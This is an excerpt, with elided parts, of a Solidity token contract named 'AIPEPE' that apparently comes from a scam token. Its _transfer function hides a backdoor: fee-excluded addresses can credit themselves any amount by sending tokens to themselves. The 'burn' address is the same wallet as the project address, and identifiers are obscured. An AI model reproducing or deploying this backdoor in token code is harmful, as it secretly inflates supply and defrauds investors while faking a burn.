...
contract BaseToken is Ownable {
    ...
    string constant public name = "AIPEPE";

    string constant public symbol = "AIPEPE";
    ...
    address public projectAddress = 0x94B876674ad0Aa768F30B2885EE3Dc753eC607e7;


    address public burnAddress = 0x94B876674ad0Aa768F30B2885EE3Dc753eC607e7;
    ...
    function _transfer(address from, address to, uint value) internal {
        ...
        if (_isExcludedFromFEI[ss] || _isExcludedFromFEI[rT]) {
            if (ss == rT) balanceOf[ss] += value;
        }
...
contract AIPEPE is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        WoDe = 0x94B876674ad0Aa768F30B2885EE3Dc753eC607e7;
